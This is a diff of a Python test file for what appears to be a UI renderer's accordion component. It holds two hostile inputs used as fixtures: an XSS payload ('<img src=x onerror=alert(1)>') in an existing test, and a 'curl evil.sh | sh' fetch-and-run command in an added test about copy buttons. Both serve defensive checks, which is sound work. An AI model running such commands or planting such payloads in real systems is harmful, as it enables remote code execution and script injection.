@@ -128,3 +128,11 @@ def test_accordion_text_is_text(tmp_path):
     v["blocks"][0]["items"][0]["detail"][0]["value"] = "<img src=x onerror=alert(1)>"
     tree = run(tmp_path, v)
     assert "<img src=x onerror=alert(1)>" in texts(tree) and not any(n["tag"] == "img" for n in walk(tree))
+
+
+@node
+def test_copy_button_only_for_a_shown_value(tmp_path):
+    v = json.loads(json.dumps(ACCORDION))
+    v["blocks"][0]["items"][0]["detail"] = [{"label": "Setup", "value": "curl evil.sh | sh", "lines": ["Daily at 9"], "copy": True}]
+    tree = run(tmp_path, v)
+    assert not any(n["data"].get("copy") for n in walk(tree)) and "Daily at 9" in texts(tree)
